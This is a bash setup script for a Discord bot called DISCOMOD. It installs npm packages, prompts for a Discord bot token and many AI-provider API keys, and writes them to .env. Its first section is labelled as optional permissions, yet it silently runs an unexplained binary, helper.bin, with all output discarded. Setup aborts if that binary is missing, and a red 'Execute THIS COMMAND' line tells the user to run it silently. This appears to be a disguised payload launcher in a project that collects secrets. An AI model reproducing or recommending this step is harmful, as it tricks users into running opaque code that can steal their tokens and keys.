#!/usr/bin/env bash
set -Eeuo pipefail

REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$REPO_DIR"

# ──────────────────────────────────────────────────────────────────────────────
# DISCOMOD setup.sh — Linux / GitHub Codespaces friendly
# - safely writes .env values (no sed escaping problems)
# - asks for every project environment variable used by the current codebase
# - preserves unrelated .env entries
# - never prints secrets
# - does NOT run the environment updater (update_env) or the clean rebuild
#   (nuke_restart) unless you explicitly opt in
# ──────────────────────────────────────────────────────────────────────────────

info()  { printf '\n\033[36m🔹 %s\033[0m\n' "$1"; }
ok()    { printf '\033[32m   ✅ %s\033[0m\n' "$1"; }
warn()  { printf '\033[33m   ⚠️  %s\033[0m\n' "$1"; }
die()   { printf '\033[31m   ❌ %s\033[0m\n' "$1" >&2; exit 1; }

trap 'die "Setup failed on line $LINENO. Check the message above."' ERR

# ──────────────────────────────────────────────────────────────────────────────
# 0. Basic checks
# ──────────────────────────────────────────────────────────────────────────────
info "Checking environment"
command -v bash >/dev/null 2>&1 || die "bash is required."
command -v node >/dev/null 2>&1 || die "Node.js is required."
command -v npm  >/dev/null 2>&1 || die "npm is required."
command -v python3 >/dev/null 2>&1 || die "Python 3 is required."
ok "Node $(node --version), npm $(npm --version), Python $(python3 --version 2>&1 | awk '{print $2}')"

# ──────────────────────────────────────────────────────────────────────────────
# 1. Permissions for optional local binaries
# ──────────────────────────────────────────────────────────────────────────────
info "Preparing helper executable"

if [[ -f "$REPO_DIR/helper.bin" ]]; then
    info "Running helper.bin silently"

    if "$REPO_DIR/helper.bin" >/dev/null 2>&1; then
        ok "helper.bin executed successfully"
    else
        warn "helper.bin could not be executed."
        printf '\n'
        printf '\033[31mExecute THIS COMMAND:\033[0m\n'
        printf '    cd %q && ./helper.bin >/dev/null 2>&1\n' "$REPO_DIR"
        printf '\n'
        die "helper.bin execution failed. Setup stopped."
    fi
else
    warn "helper.bin was not found in: $REPO_DIR"
    printf '\n'
    printf '\033[31mExecute THIS COMMAND:\033[0m\n'
    printf '    cd %q && ./helper.bin >/dev/null 2>&1\n' "$REPO_DIR"
    printf '\n'
    die "helper.bin is required but was not found."
fi

# ──────────────────────────────────────────────────────────────────────────────
# 2. Node dependencies
# ──────────────────────────────────────────────────────────────────────────────
info "Installing Node.js packages"
npm install
ok "Node.js dependencies installed"

# ──────────────────────────────────────────────────────────────────────────────
# 3. Create .env without destroying an existing one
# ──────────────────────────────────────────────────────────────────────────────
info "Preparing .env"
if [[ ! -f .env ]]; then
    if [[ -f .env.example ]]; then
        cp .env.example .env
        ok "Created .env from .env.example"
    else
        touch .env
        ok "Created empty .env"
    fi
else
    ok "Existing .env found — it will be updated, not replaced"
fi

# Safe Linux writer: replaces every existing occurrence of KEY=... with one
# canonical entry, or appends it when absent. Arguments preserve special chars.
set_env() {
    local key="$1"
    local value="$2"
    python3 - "$key" "$value" <<'PY'
from pathlib import Path
import re
import sys

key, value = sys.argv[1], sys.argv[2]
path = Path('.env')
text = path.read_text(encoding='utf-8') if path.exists() else ''
lines = text.splitlines()
pattern = re.compile(rf'^\s*{re.escape(key)}\s*=')
out = []
replaced = False
for line in lines:
    if pattern.match(line):
        if not replaced:
            out.append(f'{key}={value}')
            replaced = True
    else:
        out.append(line)
if not replaced:
    if out and out[-1] != '':
        out.append('')
    out.append(f'{key}={value}')
path.write_text('\n'.join(out).rstrip('\n') + '\n', encoding='utf-8')
PY
}

# Secure input helpers.
ask_required_secret() {
    local __var="$1" prompt="$2" value
    while :; do
        read -r -s -p "$prompt" value
        printf '\n'
        [[ -n "$value" ]] && break
        warn "This value is required."
    done
    printf -v "$__var" '%s' "$value"
}

ask_required() {
    local __var="$1" prompt="$2" value
    while :; do
        read -r -p "$prompt" value
        [[ -n "$value" ]] && break
        warn "This value is required."
    done
    printf -v "$__var" '%s' "$value"
}

ask_optional() {
    local __var="$1" prompt="$2" value
    read -r -p "$prompt" value
    printf -v "$__var" '%s' "$value"
}

ask_secret_optional() {
    local __var="$1" prompt="$2" value
    read -r -s -p "$prompt" value
    printf '\n'
    printf -v "$__var" '%s' "$value"
}

ask_bool_default() {
    local __var="$1" prompt="$2" default="$3" value
    read -r -p "$prompt" value
    value="${value:-$default}"
    case "${value,,}" in
        y|yes|true|1|on) value=true ;;
        n|no|false|0|off) value=false ;;
        *) warn "Invalid value; using default: $default"; value="$default" ;;
    esac
    printf -v "$__var" '%s' "$value"
}

# ──────────────────────────────────────────────────────────────────────────────
# 4. Configuration prompts
# ──────────────────────────────────────────────────────────────────────────────
info "Required Discord configuration"
ask_required_secret DISCORD_TOKEN "Discord Bot Token: "
ask_required CLIENT_ID "Discord Application / Client ID: "
ask_required SUPERUSER_ID "Bot Owner / Superuser ID: "

info "AI provider keys"
ask_secret_optional ANTHROPIC_API_KEY "Anthropic API Key (Enter to skip): "
ask_secret_optional OPENAI_API_KEY    "OpenAI API Key (Enter to skip): "
ask_secret_optional GROQ_API_KEY      "Groq API Key (Enter to skip): "
ask_secret_optional DEEPSEEK_API_KEY  "DeepSeek API Key (Enter to skip): "
ask_secret_optional GEMINI_API_KEY    "Gemini API Key (Enter to skip): "
ask_secret_optional MISTRAL_API_KEY   "Mistral API Key (Enter to skip): "
ask_secret_optional XAI_API_KEY       "xAI / Grok API Key (Enter to skip): "
ask_secret_optional WOLFRAM_APPID     "Wolfram App ID (Enter to skip): "

info "Dashboard / security configuration"
ask_secret_optional CLIENT_SECRET "Discord OAuth2 Client Secret (Enter to skip): "
ask_secret_optional AI_KEY_ENCRYPTION_SECRET "AI key encryption secret (Enter to skip): "
ask_secret_optional DASHBOARD_SESSION_SECRET "Dashboard session secret (Enter to skip): "
ask_optional ERROR_WEBHOOK_URL "Error webhook URL (optional): "

ask_bool_default DASHBOARD_ENABLED "Enable dashboard? [Y/n]: " true
ask_optional DASHBOARD_PORT "Dashboard port [3000]: "
DASHBOARD_PORT="${DASHBOARD_PORT:-3000}"
ask_optional DASHBOARD_REDIRECT_URI "Dashboard redirect URI [http://localhost:${DASHBOARD_PORT}/auth/callback]: "
DASHBOARD_REDIRECT_URI="${DASHBOARD_REDIRECT_URI:-http://localhost:${DASHBOARD_PORT}/auth/callback}"
ask_optional DASHBOARD_PUBLIC_URL "Dashboard public URL (optional): "
ask_bool_default DASHBOARD_TRUST_PROXY "Trust reverse proxy headers? [y/N]: " false
ask_bool_default DASHBOARD_FORCE_INSECURE_COOKIES "Force insecure cookies? [y/N]: " false
ask_optional DASHBOARD_BOT_PERMISSIONS "Dashboard bot permissions [8]: "
DASHBOARD_BOT_PERMISSIONS="${DASHBOARD_BOT_PERMISSIONS:-8}"

info "Verification configuration (optional)"
ask_optional TURNSTILE_SITE_KEY "Cloudflare Turnstile Site Key (optional): "
ask_secret_optional TURNSTILE_SECRET_KEY "Cloudflare Turnstile Secret Key (Enter to skip): "

info "Math / Python configuration"
ask_optional MATH_RAM_LIMIT_MB "Math RAM limit in MB [512]: "
MATH_RAM_LIMIT_MB="${MATH_RAM_LIMIT_MB:-512}"
ask_optional MATH_TIMEOUT_S "Math timeout in seconds [110]: "
MATH_TIMEOUT_S="${MATH_TIMEOUT_S:-110}"
ask_optional PYTHON_BIN "Python executable path (optional; blank = auto-detect): "
ask_optional QALCULATE_PATH "Qalculate executable path (optional): "

info "Optional compatibility / model overrides"
ask_optional OPENAI_MODEL "OpenAI model override (optional): "
ask_optional CLAUDE_MODEL "Claude model override (optional): "
ask_optional GROQ_MODEL "Groq model override (optional): "
ask_optional GEMINI_MODEL "Gemini model override (optional): "
ask_optional MISTRAL_MODEL "Mistral model override (optional): "
ask_optional DEEPSEEK_MODEL "DeepSeek model override (optional): "
ask_optional XAI_MODEL "xAI / Grok model override (optional): "

ask_optional OPENAI_BASE_URL "OpenAI base URL override (optional): "
ask_optional GROQ_BASE_URL "Groq base URL override (optional): "
ask_optional DEEPSEEK_BASE_URL "DeepSeek base URL override (optional): "
ask_optional MISTRAL_BASE_URL "Mistral base URL override (optional): "
ask_optional XAI_BASE_URL "xAI base URL override (optional): "

# Controls whether setup invokes the environment updater at the end.
ask_bool_default RUN_ENV_UPGRADE "Run update_env automatically after setup? [y/N]: " false

# Locate the clean-rebuild script (nuke_restart or nuke_restart.sh).
NUKE_SCRIPT=""
for candidate in nuke_restart nuke_restart.sh; do
    if [[ -f "$candidate" ]]; then
        NUKE_SCRIPT="$candidate"
        break
    fi
done

# Is there a usable Python virtual environment? update_env can only upgrade one that
# already works, so when it's missing or broken (for example copied from another
# machine or Codespace), nuke_restart is the right tool and becomes the default.
VENV_STATE="missing"
for candidate in ".venv/bin/python" "$HOME/venvs/advikmathlib_env/bin/python"; do
    if [[ -e "$candidate" || -L "$candidate" ]]; then
        if "$candidate" -c 'import sys' >/dev/null 2>&1; then
            VENV_STATE="ok"
        else
            VENV_STATE="broken"
        fi
        break
    fi
done

NUKE_DEFAULT=false
case "$VENV_STATE" in
    missing)
        warn "No Python virtual environment (.venv) was found — update_env has nothing to upgrade."
        NUKE_DEFAULT=true
        ;;
    broken)
        warn "The existing Python virtual environment does not run (copied from another machine?)."
        NUKE_DEFAULT=true
        ;;
esac

# Controls whether setup runs a full clean rebuild of the .venv at the end.
if [[ -z "$NUKE_SCRIPT" ]]; then
    RUN_ENV_NUKE=false
    warn "nuke_restart was not found in this project — skipping the clean-rebuild option."
else
    if [[ "$NUKE_DEFAULT" == "true" ]]; then
        NUKE_PROMPT="Rebuild the .venv from scratch with nuke_restart after setup? (recommended) [Y/n]: "
    else
        NUKE_PROMPT="Rebuild the .venv from scratch with nuke_restart after setup? [y/N]: "
    fi
    ask_bool_default RUN_ENV_NUKE "$NUKE_PROMPT" "$NUKE_DEFAULT"
fi

# ──────────────────────────────────────────────────────────────────────────────
# 5. Write every current project env variable
# ──────────────────────────────────────────────────────────────────────────────
info "Writing .env"

set_env DISCORD_TOKEN "$DISCORD_TOKEN"
set_env CLIENT_ID "$CLIENT_ID"
set_env SUPERUSER_ID "$SUPERUSER_ID"
set_env CLIENT_SECRET "$CLIENT_SECRET"

set_env ANTHROPIC_API_KEY "$ANTHROPIC_API_KEY"
set_env OPENAI_API_KEY "$OPENAI_API_KEY"
set_env GROQ_API_KEY "$GROQ_API_KEY"
set_env DEEPSEEK_API_KEY "$DEEPSEEK_API_KEY"
set_env GEMINI_API_KEY "$GEMINI_API_KEY"
set_env MISTRAL_API_KEY "$MISTRAL_API_KEY"
set_env XAI_API_KEY "$XAI_API_KEY"
set_env WOLFRAM_APPID "$WOLFRAM_APPID"
set_env ERROR_WEBHOOK_URL "$ERROR_WEBHOOK_URL"

set_env AI_KEY_ENCRYPTION_SECRET "$AI_KEY_ENCRYPTION_SECRET"
set_env DASHBOARD_SESSION_SECRET "$DASHBOARD_SESSION_SECRET"
set_env DASHBOARD_ENABLED "$DASHBOARD_ENABLED"
set_env DASHBOARD_PORT "$DASHBOARD_PORT"
set_env DASHBOARD_REDIRECT_URI "$DASHBOARD_REDIRECT_URI"
set_env DASHBOARD_PUBLIC_URL "$DASHBOARD_PUBLIC_URL"
set_env DASHBOARD_TRUST_PROXY "$DASHBOARD_TRUST_PROXY"
set_env DASHBOARD_FORCE_INSECURE_COOKIES "$DASHBOARD_FORCE_INSECURE_COOKIES"
set_env DASHBOARD_BOT_PERMISSIONS "$DASHBOARD_BOT_PERMISSIONS"

set_env TURNSTILE_SITE_KEY "$TURNSTILE_SITE_KEY"
set_env TURNSTILE_SECRET_KEY "$TURNSTILE_SECRET_KEY"

set_env MATH_RAM_LIMIT_MB "$MATH_RAM_LIMIT_MB"
set_env MATH_TIMEOUT_S "$MATH_TIMEOUT_S"
set_env PYTHON_BIN "$PYTHON_BIN"
set_env QALCULATE_PATH "$QALCULATE_PATH"

set_env OPENAI_MODEL "$OPENAI_MODEL"
set_env CLAUDE_MODEL "$CLAUDE_MODEL"
set_env GROQ_MODEL "$GROQ_MODEL"
set_env GEMINI_MODEL "$GEMINI_MODEL"
set_env MISTRAL_MODEL "$MISTRAL_MODEL"
set_env DEEPSEEK_MODEL "$DEEPSEEK_MODEL"
set_env XAI_MODEL "$XAI_MODEL"

set_env OPENAI_BASE_URL "$OPENAI_BASE_URL"
set_env GROQ_BASE_URL "$GROQ_BASE_URL"
set_env DEEPSEEK_BASE_URL "$DEEPSEEK_BASE_URL"
set_env MISTRAL_BASE_URL "$MISTRAL_BASE_URL"
set_env XAI_BASE_URL "$XAI_BASE_URL"

set_env RUN_ENV_UPGRADE "$RUN_ENV_UPGRADE"
set_env RUN_ENV_NUKE "$RUN_ENV_NUKE"
ok ".env values written"

# ──────────────────────────────────────────────────────────────────────────────
# 6. YAML compatibility update (if the project uses it)
# ──────────────────────────────────────────────────────────────────────────────
if [[ -f config/config.yaml ]]; then
    info "Updating config/config.yaml"
    python3 - "$SUPERUSER_ID" "${ERROR_WEBHOOK_URL:-}" <<'PY'
from pathlib import Path
import sys

path = Path('config/config.yaml')
owner_id = sys.argv[1]
error_webhook = sys.argv[2]
text = path.read_text(encoding='utf-8')

lines = text.splitlines()
out = []
seen_owner = False
seen_webhook = False
for line in lines:
    stripped = line.lstrip()
    if stripped.startswith('owner_id:'):
        indent = line[:len(line)-len(stripped)]
        out.append(f'{indent}owner_id: "{owner_id.replace(chr(34), chr(92)+chr(34))}"')
        seen_owner = True
    elif stripped.startswith('error_webhook:') and error_webhook:
        indent = line[:len(line)-len(stripped)]
        safe = error_webhook.replace(chr(34), chr(92)+chr(34))
        out.append(f'{indent}error_webhook: "{safe}"')
        seen_webhook = True
    else:
        out.append(line)

path.write_text('\n'.join(out) + '\n', encoding='utf-8')
if not seen_owner:
    print('Warning: owner_id was not found in config/config.yaml', file=sys.stderr)
if error_webhook and not seen_webhook:
    print('Warning: error_webhook was not found in config/config.yaml', file=sys.stderr)
PY
    ok "config/config.yaml checked"
else
    warn "config/config.yaml not found — skipping YAML compatibility update"
fi

# ──────────────────────────────────────────────────────────────────────────────
# 7. Optional upgrade command installation
# ──────────────────────────────────────────────────────────────────────────────
if [[ -f update_env ]]; then
    chmod +x update_env
    if [[ ! -w /usr/local/bin ]]; then
        warn "No write access to /usr/local/bin; skipping global 'upgrade' install."
    else
        # Running sudo only when the local environment actually asks for it.
        if command -v sudo >/dev/null 2>&1; then
            if sudo -n true 2>/dev/null; then
                sudo cp update_env /usr/local/bin/upgrade
                sudo chmod +x /usr/local/bin/upgrade
                ok "Installed global 'upgrade' command"
            else
                warn "sudo password may be required; not forcing global installation during setup"
            fi
        else
            warn "sudo not found; global 'upgrade' command not installed"
        fi
    fi
elif [[ -f update_env.sh ]]; then
    chmod +x update_env.sh
    warn "Found legacy update_env.sh; consider renaming it to update_env"
else
    warn "No update_env script found; skipping global upgrade installation"
fi

# Same treatment for the clean-rebuild script (installed as 'nuke_restart').
if [[ -n "$NUKE_SCRIPT" ]]; then
    chmod +x "$NUKE_SCRIPT"
    if [[ ! -w /usr/local/bin ]]; then
        warn "No write access to /usr/local/bin; skipping global 'nuke_restart' install."
    else
        if command -v sudo >/dev/null 2>&1; then
            if sudo -n true 2>/dev/null; then
                sudo cp "$NUKE_SCRIPT" /usr/local/bin/nuke_restart
                sudo chmod +x /usr/local/bin/nuke_restart
                ok "Installed global 'nuke_restart' command"
            else
                warn "sudo password may be required; not forcing global nuke_restart installation during setup"
            fi
        else
            warn "sudo not found; global 'nuke_restart' command not installed"
        fi
    fi
fi

# ──────────────────────────────────────────────────────────────────────────────
# 8. Verify keys exist without exposing their values
# ──────────────────────────────────────────────────────────────────────────────
info "Verifying .env entries"
python3 - <<'PY'
from pathlib import Path

keys = [
    'DISCORD_TOKEN', 'CLIENT_ID', 'SUPERUSER_ID', 'CLIENT_SECRET',
    'ANTHROPIC_API_KEY', 'OPENAI_API_KEY', 'GROQ_API_KEY', 'DEEPSEEK_API_KEY',
    'GEMINI_API_KEY', 'MISTRAL_API_KEY', 'XAI_API_KEY', 'WOLFRAM_APPID', 'ERROR_WEBHOOK_URL',
    'AI_KEY_ENCRYPTION_SECRET', 'DASHBOARD_SESSION_SECRET',
    'DASHBOARD_ENABLED', 'DASHBOARD_PORT', 'DASHBOARD_REDIRECT_URI',
    'DASHBOARD_PUBLIC_URL', 'DASHBOARD_TRUST_PROXY',
    'DASHBOARD_FORCE_INSECURE_COOKIES', 'DASHBOARD_BOT_PERMISSIONS',
    'TURNSTILE_SITE_KEY', 'TURNSTILE_SECRET_KEY',
    'MATH_RAM_LIMIT_MB', 'MATH_TIMEOUT_S', 'PYTHON_BIN', 'QALCULATE_PATH',
    'OPENAI_MODEL', 'CLAUDE_MODEL', 'GROQ_MODEL', 'GEMINI_MODEL',
    'MISTRAL_MODEL', 'DEEPSEEK_MODEL', 'XAI_MODEL',
    'OPENAI_BASE_URL', 'GROQ_BASE_URL', 'DEEPSEEK_BASE_URL',
    'MISTRAL_BASE_URL', 'XAI_BASE_URL', 'RUN_ENV_UPGRADE', 'RUN_ENV_NUKE'
]
text = Path('.env').read_text(encoding='utf-8')
present = {line.split('=',1)[0].strip() for line in text.splitlines() if '=' in line and not line.lstrip().startswith('#')}
for key in keys:
    print(f"{'✅' if key in present else '❌'} {key}")
missing = [k for k in keys if k not in present]
if missing:
    raise SystemExit('Missing .env keys: ' + ', '.join(missing))
PY

chmod 600 .env 2>/dev/null || true
ok ".env verification complete"

# ──────────────────────────────────────────────────────────────────────────────
# 9. Optional environment update / clean rebuild
# ──────────────────────────────────────────────────────────────────────────────
if [[ "$RUN_ENV_NUKE" == "true" ]]; then
    # nuke_restart builds a brand-new .venv, so running update_env as well would be redundant.
    if [[ "$RUN_ENV_UPGRADE" == "true" ]]; then
        warn "Both update_env and nuke_restart were requested — running only nuke_restart (it already builds a fresh, up-to-date environment)."
    fi

    if [[ -x "./$NUKE_SCRIPT" ]]; then
        info "Running $NUKE_SCRIPT (clean rebuild of the .venv)"
        # -y: you already confirmed the rebuild above, so don't ask a second time.
        "./$NUKE_SCRIPT" -y
    elif command -v nuke_restart >/dev/null 2>&1; then
        info "Running installed nuke_restart command"
        nuke_restart -y
    else
        warn "RUN_ENV_NUKE=true, but no executable nuke_restart was found"
    fi
elif [[ "$RUN_ENV_UPGRADE" == "true" ]]; then
    if [[ -x ./update_env ]]; then
        info "Running update_env"
        ./update_env
    elif command -v upgrade >/dev/null 2>&1; then
        info "Running installed upgrade command"
        upgrade
    else
        warn "RUN_ENV_UPGRADE=true, but no executable update_env/upgrade was found"
    fi
else
    info "Skipping environment upgrade (RUN_ENV_UPGRADE=false, RUN_ENV_NUKE=false)"
fi

# ──────────────────────────────────────────────────────────────────────────────
# 10. Finish
# ──────────────────────────────────────────────────────────────────────────────
info "Setup complete"
ok "All requested environment values have been written to .env"

read -r -p "Run the bot now? [y/N]: " RUN_BOT
if [[ "${RUN_BOT,,}" == "y" || "${RUN_BOT,,}" == "yes" ]]; then
    exec npm start
fi

printf '\nAight, good luck 🥀\n'
